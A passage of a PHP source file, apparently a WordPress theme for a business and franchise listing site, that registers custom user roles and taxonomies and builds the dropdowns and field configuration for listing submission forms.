                return false;
            }
        }
        return $roles;
    }
}



//custom new user roles
function custom_new_role()
{
    $roles = custom_register_roles();
    foreach ($roles as $key => $role) {
        //add the new user role
        add_role(
            $key,
            $role,
            array(
                'read'         => true,
                'delete_posts' => false,
            )
        );
        // remove_role($key);
    }
}
add_action('admin_init', 'custom_new_role');

if (!function_exists('display_user_roles')) {
    function display_user_roles()
    {
        $user_id = get_current_user_id();
        $user_info = get_userdata($user_id);
        $user_roles = implode(', ', $user_info->roles);
        return $user_roles;
    }
}

if (!function_exists('display_role_name')) {
    function display_role_name()
    {
        global $wp_roles;
        $u = get_userdata(get_current_user_id());
        $role = array_shift($u->roles);
        return  $user->role = $wp_roles->roles[$role]['name'];
    }
}

if (!function_exists('welcome_user_roles')) {
    function welcome_user_roles()
    {
        $str = (display_role_name());
        return $str;
    }
}

if (! function_exists('is_buyer')) {
    function is_buyer()
    {
        return display_user_roles() == 'buyer' ? : false;
    }
}
if (! function_exists('is_administrator')) {
    function is_administrator()
    {
        return display_user_roles() == 'administrator' ? : false;
    }
}
if (! function_exists('is_biz_for_sale')) {
    function is_biz_for_sale()
    {
        return display_user_roles() == 's_biz_for_sale' ? : false;
    }
}
if (! function_exists('is_franchise')) {
    function is_franchise()
    {
        return display_user_roles() == 's_franchise' ? : false;
    }
}

//set default role to buyer
update_option('default_role', 'buyer');

//update user role
function customer_update_user_role($user_id, $user_type = 'buyer')
{
    $role = 'buyer';
   
    if (custom_register_roles($user_type)) {
        $role = $user_type;
    }
    $user = get_user_by('id', $user_id);

    if (! empty($role) && $role != 'buyer') {
        $user->remove_role('buyer');
    }
    
    $user->add_role($role);
}

function get_term_name_by_id($term_id=0, $termcategory='businesstype')
{
    $result           = get_term_by('term_id', $term_id, $termcategory);
    return $result->name;
}
function wpestate_show_custom_price($postID)
{
    $result = '';
    $result = get_post_meta($postID, 'specific_price', true);
    return $result;
}

function usd_show($number)
{
    return " ".$number;
}
function custom_number_format($n, $precision = 1)
{
    if ($n < 900) {
        // Default
        $n_format = number_format($n);
    } elseif ($n < 900000) {
        // Thausand
        $n_format = number_format($n / 1000, $precision). 'K';
    } elseif ($n < 900000000) {
        // Million
        $n_format = number_format($n / 1000000, $precision). 'M';
    } elseif ($n < 900000000000) {
        // Billion
        $n_format = number_format($n / 1000000000, $precision). 'B';
    } else {
        // Trillion
        $n_format = number_format($n / 1000000000000, $precision). 'T';
    }
    if ($n_format == '') {
        return "USD 0.0";
    }
    return "USD " .$n_format;
}


/*----------------------Add Ownertype Taxonomy----------------------------------*/
function add_ownertype_taxonomy()
{
    //set the name of the taxonomy
    $taxonomy = 'ownertype';
    //set the post types for the taxonomy
    $object_type = 'estate_property';
    
    //populate our array of names for our taxonomy
    $labels = array(
        'name'               => 'Ownertypes',
        'singular_name'      => 'Ownertype',
        'search_items'       => 'Search Ownertypes',
        'all_items'          => 'All Ownertypes',
        'parent_item'        => 'Parent Ownertype',
        'parent_item_colon'  => 'Parent Ownertype:',
        'update_item'        => 'Update Ownertype',
        'edit_item'          => 'Edit Ownertype',
        'add_new_item'       => 'Add New Ownertype',
        'new_item_name'      => 'New Ownertype Name',
        'menu_name'          => 'Ownertype'
    );
    
    //define arguments to be used
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'ownertype')
    );
    
    //call the register_taxonomy function
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_ownertype_taxonomy');
/*-------------Ending Ownertype Taxonomy-------------------------------*/

/*----------------------Add Offering Taxonomy----------------------------------*/
function add_offering_taxonomy()
{
    //set the name of the taxonomy
    $taxonomy = 'offering';
    //set the post types for the taxonomy
    $object_type = 'estate_property';
    
    //populate our array of names for our taxonomy
    $labels = array(
        'name'               => 'Offerings',
        'singular_name'      => 'Offering',
        'search_items'       => 'Search Offerings',
        'all_items'          => 'All Offerings',
        'parent_item'        => 'Parent Offering',
        'parent_item_colon'  => 'Parent Offering:',
        'update_item'        => 'Update Offering',
        'edit_item'          => 'Edit Offering',
        'add_new_item'       => 'Add New Offering',
        'new_item_name'      => 'New Offering Name',
        'menu_name'          => 'Offering'
    );
    
    //define arguments to be used
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'offering')
    );
    
    //call the register_taxonomy function
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_offering_taxonomy');
/*-------------Ending add_offering_taxonomy Taxonomy-------------------------------*/
/*----------------------Add Offering Taxonomy----------------------------------*/
function add_businesstype_taxonomy()
{
    //set the name of the taxonomy
    $taxonomy = 'businesstype';
    //set the post types for the taxonomy
    $object_type = 'estate_property';
    
    //populate our array of names for our taxonomy
    $labels = array(
        'name'               => 'Businesstypes',
        'singular_name'      => 'Businesstype',
        'search_items'       => 'Search Businesstype',
        'all_items'          => 'All Businesstypes',
        'parent_item'        => 'Parent Businesstype',
        'parent_item_colon'  => 'Parent Businesstype:',
        'update_item'        => 'Update Businesstype',
        'edit_item'          => 'Edit Businesstype',
        'add_new_item'       => 'Add New Businesstype',
        'new_item_name'      => 'New Businesstype Name',
        'menu_name'          => 'Businesstype'
    );
    
    //define arguments to be used
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'businesstype')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_businesstype_taxonomy');
/*-------------Ending add_offering_taxonomy Taxonomy-------------------------------*/


/*----------------------Add add_biztype_taxonomy Taxonomy----------------------------------*/
function add_biztype_taxonomy()
{
    //set the name of the taxonomy
    $taxonomy = 'biz_type';
    //set the post types for the taxonomy
    $object_type = 'estate_property';
    
    //populate our array of names for our taxonomy
    $labels = array(
        'name'               => 'BizTypes',
        'singular_name'      => 'BizType',
        'search_items'       => 'Search BizType',
        'all_items'          => 'All BizType',
        'parent_item'        => 'Parent BizType',
        'parent_item_colon'  => 'Parent BizType:',
        'update_item'        => 'Update BizType',
        'edit_item'          => 'Edit BizType',
        'add_new_item'       => 'Add New BizType',
        'new_item_name'      => 'New BizType Name',
        'menu_name'          => 'BizType'
    );
    
    //define arguments to be used
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'biz_type')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_biztype_taxonomy');
/*-------------Ending add_biztype_taxonomy Taxonomy-------------------------------*/

/*----------------------Add add_number_of_store_taxonomy Taxonomy----------------------------------*/
function add_number_of_store_taxonomy()
{
    //set the name of the taxonomy
    $taxonomy = 'number_of_store';
    //set the post types for the taxonomy
    $object_type = 'estate_property';
    
    //populate our array of names for our taxonomy
    $labels = array(
        'name'               => 'Numstores',
        'singular_name'      => 'Numstore',
        'search_items'       => 'Search Number Of stores',
        'all_items'          => 'All numstores',
        'parent_item'        => 'Parent Numstores',
        'parent_item_colon'  => 'Parent Numstore:',
        'update_item'        => 'Update Numstore',
        'edit_item'          => 'Edit Numstore',
        'add_new_item'       => 'Add New Numstore',
        'new_item_name'      => 'New Numstore Name',
        'menu_name'          => 'Number of Store'
    );
    
    //define arguments to be used
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'number_of_store')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_number_of_store_taxonomy');

/*-------------Ending add_number_of_store_taxonomy Taxonomy-------------------------------*/


function add_biz_status_taxonomy()
{
    $taxonomy = 'biz_status';
    $object_type = 'estate_property';
    $labels = array(
        'name'               => 'Status of Bizs',
        'singular_name'      => 'Status of Biz',
        'search_items'       => 'Search Status of Biz',
        'all_items'          => 'All Status of Biz',
        'parent_item'        => 'Parent Status of Biz',
        'parent_item_colon'  => 'Parent Status of Biz:',
        'update_item'        => 'Update Status of Biz',
        'edit_item'          => 'Edit Status of Biz',
        'add_new_item'       => 'Add New Status of Biz',
        'new_item_name'      => 'New Status of Biz',
        'menu_name'          => 'Status of Biz'
    );
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'biz_status')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_biz_status_taxonomy');

function add_asking_price_taxonomy()
{
    $taxonomy = 'asking_price';
    $object_type = 'estate_property';
    $labels = array(
        'name'               => 'asking_prices',
        'singular_name'      => 'asking_price',
        'search_items'       => 'Search asking_price',
        'all_items'          => 'All asking_price',
        'parent_item'        => 'Parent asking_price',
        'parent_item_colon'  => 'Parent asking_price',
        'update_item'        => 'Update asking_price',
        'edit_item'          => 'Edit asking_price',
        'add_new_item'       => 'Add New asking_price',
        'new_item_name'      => 'New asking_price',
        'menu_name'          => 'Asking_price'
    );
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'asking_price')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_asking_price_taxonomy');

function add_sale_revenue_taxonomy()
{
    $taxonomy = 'sale_revenue';
    $object_type = 'estate_property';
    $labels = array(
        'name'               => 'Sale Revenues',
        'singular_name'      => 'Sale Revenue',
        'search_items'       => 'Search Sale Revenue',
        'all_items'          => 'All Sale Revenue',
        'parent_item'        => 'Parent Sale Revenue',
        'parent_item_colon'  => 'Parent Sale Revenue',
        'update_item'        => 'Update Sale Revenue',
        'edit_item'          => 'Edit Sale Revenue',
        'add_new_item'       => 'Add New Sale Revenue',
        'new_item_name'      => 'New Sale Revenue',
        'menu_name'          => 'Sale Revenue'
    );
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'sale_revenue')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_sale_revenue_taxonomy');

function add_cashflow_taxonomy()
{
    $taxonomy = 'cashflow';
    $object_type = 'estate_property';
    $labels = array(
        'name'               => 'Cash Flows',
        'singular_name'      => 'Cash Flow',
        'search_items'       => 'Search Cash Flow',
        'all_items'          => 'All Cash Flow',
        'parent_item'        => 'Parent Cash Flow',
        'parent_item_colon'  => 'Parent Cash Flow',
        'update_item'        => 'Update Cash Flow',
        'edit_item'          => 'Edit Cash Flow',
        'add_new_item'       => 'Add New Cash Flow',
        'new_item_name'      => 'New Cash Flow',
        'menu_name'          => 'Cash Flow'
    );
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'cashflow')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_cashflow_taxonomy');

function add_status_taxonomy()
{
    $taxonomy = 'status';
    $object_type = 'estate_property';
    $labels = array(
        'name'               => 'Status',
        'singular_name'      => 'Status',
        'search_items'       => 'Search Status',
        'all_items'          => 'All Status',
        'parent_item'        => 'Parent Status',
        'parent_item_colon'  => 'Parent Status',
        'update_item'        => 'Update Status',
        'edit_item'          => 'Edit Status',
        'add_new_item'       => 'Add New Status',
        'new_item_name'      => 'New Status',
        'menu_name'          => 'Status'
    );
    $args = array(
        'labels'            => $labels,
        'hierarchical'      => true,
        'show_ui'           => true,
        'how_in_nav_menus'  => true,
        'public'            => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'status')
    );
    register_taxonomy($taxonomy, $object_type, $args);
}
add_action('init', 'add_status_taxonomy');


/*-------------Ending add_property_subcategory_taxonomy Taxonomy-------------------------------*/
function custom_offering_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'offering',
        'id'          => 'offering',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'offering',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_biz_status_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'biz_status',
        'id'          => 'biz_status',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'biz_status',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_ownertype_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'ownertype',
        'id'          => 'ownertype',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'ownertype',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_biztype_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'biz_type',
        'id'          => 'biz_type',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'biz_type',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_categories_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control ajax',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'property_category',
        'id'          => 'property_category',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'property_category',
        'hierarchical'=> true,
        'parent' => 0,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_subcategories_dropdown($args, $value = '')
{
    if ($value == '') {
        // When Create
        $args=array(
        'class'       => 'form-control fill_by_ajax',
        'hide_empty'  => false,
        'name'        => 'property_subcategory',
        'id'          => 'property_subcategory',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => '',
        'hierarchical'=> true,
        'value_field' => ''
        );
        print '
            <select class="form-control fill_by_ajax" name="property_subcategory" id="property_subcategory">
                <option value="-1">None</option>
            </select>
        ';
    } else {
        //When Editing
        
        $child_term = get_term($value, 'property_category');
        $parent_term = get_term($child_term->parent, 'property_category');
        $parentID = ($parent_term->term_id);
        if ($value == -1) {
            $listing_edit = $_GET['listing_edit'];
            $ref = get_post_meta($listing_edit, 'property_category', true);
            $parentID = $ref;
        }
        $args=array(
        'class'       => 'form-control fill_by_ajax',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'property_subcategory',
        'id'          => 'property_subcategory',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'property_category',
        'hierarchical'=> true,
        'value_field' => 'key',
        'parent' => $parentID
        );
        wp_dropdown_categories($args);
    }
}
function custom_business_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'businesstype',
        'id'          => 'businesstype',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'businesstype',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_location_dropdown($args, $value = '')
{
    $args = array(
        'class'       => 'select-submit2',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'property_city',
        'id'          => 'property_city',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'property_city',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_textarea_editor($args, $value)
{
    $defaults = array(
        'textarea_rows' =>  6,
        'textarea_name' =>  'wpestate_description',
        'wpautop'       =>  true, // use wpautop?
        'media_buttons' =>  false, // show insert/upload button(s)
        'tabindex'      =>  '',
        'editor_css'    =>  '',
        'editor_class'  => '',
        'teeny'         => false,
        'dfw'           => false,
        'tinymce'       => false,
        'quicktags'     => array("buttons"=>" "),
        // 'quicktags'     => array("buttons"=>"strong,em,block,ins,ul,li,ol,close"),
    );
   
    $options = wp_parse_args($args, $defaults);
    wp_editor(
        stripslashes($value),
        'description',
        $options
    );
}
function custom_asking_price_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'asking_price',
        'id'          => 'asking_price',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'asking_price',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}

function custom_sale_revenue_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'sale_revenue',
        'id'          => 'sale_revenue',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'sale_revenue',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}

function custom_cashflow_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'cashflow',
        'id'          => 'cashflow',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'cashflow',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}
function custom_status_dropdown($args, $value = '')
{
    $args=array(
        'class'       => 'form-control',
        'hide_empty'  => false,
        'selected'    => $value,
        'name'        => 'status',
        'id'          => 'status',
        'orderby'     => 'NAME',
        'order'       => 'ASC',
        'show_option_none'   => __('None', 'wpestate'),
        'taxonomy'    => 'status',
        'hierarchical'=> true,
        'value_field' => 'key'
    );
    wp_dropdown_categories($args);
}


function custom_callback($callback, $args = null, $value = '')
{
    $callback($args, $value);
}
function custom_prop_featured($args, $value)
{
    $radio = '';
    $checked = '';
    if ($value == 1) {
        $radio  = '
            <div class="radio">
            <label><input checked type="radio" name="prop_featured" value ="1"/> Yes </label>
            </div>
            <div class="radio">
            <label><input   type="radio" name="prop_featured" value ="0"/> No </label>
            </div>
        ';
    } else {
        $radio  = '
            <div class="radio">
            <label><input  type="radio" name="prop_featured" value ="1"/> Yes </label>
            </div>
            <div class="radio">
            <label><input  checked type="radio" name="prop_featured" value ="0"/> No </label>
            </div>
        ';
    }
   
    echo $radio;
}

function custom_property_fields($index = null)
{
    $arr = array(
        'franchise' => array(
            'fields' => array(
                'biz_type' => array(
                    'label' => 'Biz Type/Category',
                    'small_label' => 'Selecting a category will make it easier for users to find you property in search results.',
                    'columns' => array(
                        'property_category' => array(
                            'label' => 'Category',
                            'type' => 'select',
                            'col' => 'half_form',//half_form
                            'callback' => 'custom_categories_dropdown',
                            'is_require' => true,
                        ),
                        'property_subcategory' => array(
                            'label' => 'Listed in',
                            'type' => 'select',
                            'col' => 'half_form',//half_form
                            'callback' => 'custom_subcategories_dropdown',
                            'is_require' => true,
                        ),
                    ),
                ),
                'prop_featured' => array(
                    'label' => 'Featured Property',
                    'small_label' => 'Please specify your featured property here.',
                    'columns' => array(
                        'prop_featured' => array(
                            'label' => 'Featured Property',
                            'type' => 'radio',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_prop_featured',
                            'is_require' => false,
                        ),
                    ),
                ),
                'list_details' => array(
                    'label' => 'Listing Details',
                    'small_label' => 'Add a title more info about your property.',
                    'columns' => array(
                        'wpestate_title' => array(
                            'is_post_title' => true,
                            'label' => 'Title',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true,
                        ),
                        'brand_name' => array(
                            'label' => 'Brand name',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'offering' => array(
                            'label' => 'Offer for',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_offering_dropdown',
                            'is_require' => true
                        ),
                        'overview' => array(
                            'label' => 'Overview',
                            'type' => 'textarea',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'about_your_brand' => array(
                            'label' => 'About your brand',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                    ),
                ),
                'select_location' => array(
                    'label' => 'Select Location',
                    'small_label' => 'Please specify your business location here.',
                    'columns' => array(
                        'property_city' => array(
                            'label' => 'Location/City',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_location_dropdown',
                            'is_require' => true,
                        ),
                    ),
                ),
                'price_expected_sale' => array(
                    'label' => 'Price and Expected sale',
                    'small_label' => 'Price and Expected sale',
                    'columns' => array(
                        'specific_price' => array(
                            'label' => 'Specific Price',
                            'type' => 'number',
                            'is_require' => true,
                            'is_currency' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'asking_price' => array(
                            'label' => 'Asking Price',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_asking_price_dropdown',
                            'is_require' => true,
                        ),
                        'sale_revenue' => array(
                            'label' => 'Average Sales Revenue',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_sale_revenue_dropdown',
                            'is_require' => true,
                        ),
                        'cashflow' => array(
                            'label' => 'Cash Flow',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_cashflow_dropdown',
                            'is_require' => true,
                        ),
                        'expected_profir_margin' => array(
                            'label' => 'Expected Profit Margin',
                            'type' => 'number',
                            'is_require' => true,
                            'is_currency' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                    ),
                ),
                'franchise_detail' => array(
                    'label' => 'Franchise Details',
                    'small_label' => 'Price and Expected sale.',
                    'columns' => array(
                        'space_required' => array(
                            'label' => 'Space required(fee,deposit,period)',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true,
                        ),
                        'average_staff' => array(
                            'label' => 'Average Staff',
                            'type' => 'number',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'royalty_fee' => array(
                            'label' => 'Royalty fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'brand_logo' => array(
                            'label' => 'Brand Logo',
                            'type' => 'file',
                            'is_brand_logo' => true,
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                            'callback' => array(
                                'function_name' => 'custom_upload_element',
                                'args' => array(
                                    'name' => 'brand_logo',
                                    'label' => 'Brand Logo',
                                    'btn_id' => 'brand-aaiu-uploader',
                                    'container_id' => 'brand-aaiu-upload-container',
                                    'upload_imagelist' => 'brand-upload-imagelist',
                                    'imagelist' => 'brand-imagelist',
                                    'multi_selection' => false,
                                    'extensions' => "jpeg,jpg,gif,png",
                                    'max_images' => 1
                                ),
                                'value' => '',
                            ),
                         
                        ),
                        'photos' => array(
                            'label' => 'Upload Photo',
                            'type' => 'file',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                            'is_thumbnail' => true,
                            'callback' => array(
                                'function_name' => 'custom_upload_element',
                                'args' => array(
                                    'name' => 'photos',
                                    'label' => 'Select Photo',
                                    'btn_id' => 'btn_photos',
                                    'container_id' => 'photo-upload-container',
                                    'upload_imagelist' => 'photo-upload-imagelist',
                                    'imagelist' => 'photo-imagelist',
                                    'multi_selection' => true,
                                    'extensions' => "jpeg,jpg,gif,png",
                                    'max_images' => intval(get_option('wp_estate_prop_image_number', '')),
                                    'script_no' => 2
                                ),
                                'value' => '',
                            ),
                        ),
                        'docs' => array(
                            'label' => 'Upload Document',
                            'type' => 'file',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                            'is_docs' => true,
                            'callback' => array(
                                'function_name' => 'custom_upload_element',
                                'args' => array(
                                    'name' => 'docs',
                                    'label' => 'Select Docs',
                                    'btn_id' => 'btn_files',
                                    'container_id' => 'file-upload-container',
                                    'upload_imagelist' => 'docs-upload-imagelist',
                                    'imagelist' => 'docs-imagelist',
                                    'multi_selection' => true,
                                    'extensions' => "docx,doc,pdf,txt,xlsx,xls,ppt,pub",
                                    'max_images' => intval(get_option('wp_estate_prop_image_number', '')),
                                    'script_no' => 3
                                ),
                                'value' => '',
                            ),
                        ),
                        'website_address' => array(
                            'label' => 'Website Address',
                            'type' => 'text',
                            'class' => 'form-control',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                        ),
                        'video' => array(
                            'label' => 'Video Iframe',
                            'type' => 'text',
                            'is_video' => true,
                            'class' => 'form-control',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                        ),
                    ),
                ),
                'biz_details' => array(
                    'label' => 'Price and Expected sale',
                    'small_label' => 'Please specify your business location here.',
                    'columns' => array(
                        'year_establish' => array(
                            'label' => 'Year Established',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'product_service' => array(
                            'label' => 'Product/Service',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'procedure' => array(
                            'label' => 'Procedure',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'support_and_training' => array(
                            'label' => 'Support and Training',
                            'type' => 'number',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'origin' => array(
                            'label' => 'Origin',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'wpestate_description' => array(
                            'label' => 'Property Description',
                            'type' => 'textarea',
                            'is_require' => false,
                            'is_post_description' => true,
                            'callback' => array(
                                'function_name' => 'custom_textarea_editor',
                                'args' => array(
                                    'textarea_name' => 'wpestate_description',
                                    'textarea_rows' => 10
                                ),
                                'value' => '',
                            ),
                            'col' => 'full_form',//half_form
                        ),
                    ),
                ),
            ),
        ),
        'biz_for_sale' => array(
            'fields' => array(
                 'biz_type' => array(
                    'label' => 'Biz Type/Category',
                    'small_label' => 'Selecting a category will make it easier for users to find you property in search results.',
                    'columns' => array(
                        'property_category' => array(
                            'label' => 'Category',
                            'type' => 'select',
                            'col' => 'half_form',//half_form
                            'callback' => 'custom_categories_dropdown',
                            'is_require' => true,
                        ),
                        'property_subcategory' => array(
                            'label' => 'Biz Type',
                            'type' => 'select',
                            'col' => 'half_form',//half_form
                            'callback' => 'custom_subcategories_dropdown',
                            'is_require' => false,
                        ),
                    ),
                ),
                'prop_featured' => array(
                    'label' => 'Featured Property',
                    'small_label' => 'Please specify your featured property here.',
                    'columns' => array(
                        'prop_featured' => array(
                            'label' => 'Featured Property',
                            'type' => 'radio',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_prop_featured',
                            'is_require' => false,
                        ),
                    ),
                ),
                'list_details' => array(
                    'label' => 'Listing Details',
                    'small_label' => 'Add your listing detail here.',
                    'columns' => array(
                        'wpestate_title' => array(
                            'is_post_title' => true,
                            'label' => 'Title',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true,
                        ),
                        'ownertype' => array(
                            'label' => 'I am a ',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_ownertype_dropdown',
                            'is_require' => true
                        ),
                        'listing_head' => array(
                            'label' => 'Listing headline',
                            'type' => 'text',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'overview' => array(
                            'label' => 'Overview',
                            'type' => 'textarea',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'reason' => array(
                            'label' => 'Reason',
                            'type' => 'textarea',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'biz_status' => array(
                            'label' => 'Status of Biz',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_biz_status_dropdown',
                            'is_require' => true,
                        ),
                    ),
                ),
                'select_location' => array(
                    'label' => 'Select Location',
                    'small_label' => 'Please specify your business location here.',
                    'columns' => array(
                        'property_city' => array(
                            'label' => 'Location/City',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_location_dropdown',
                            'is_require' => true,
                        ),
                    ),
                ),
                'financial_info' => array(
                    'label' => 'Financial Info',
                    'small_label' => 'Describe your financial information',
                    'columns' => array(
                        'specific_price' => array(
                            'label' => 'Specific Price',
                            'type' => 'number',
                            'is_require' => true,
                            'is_currency' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
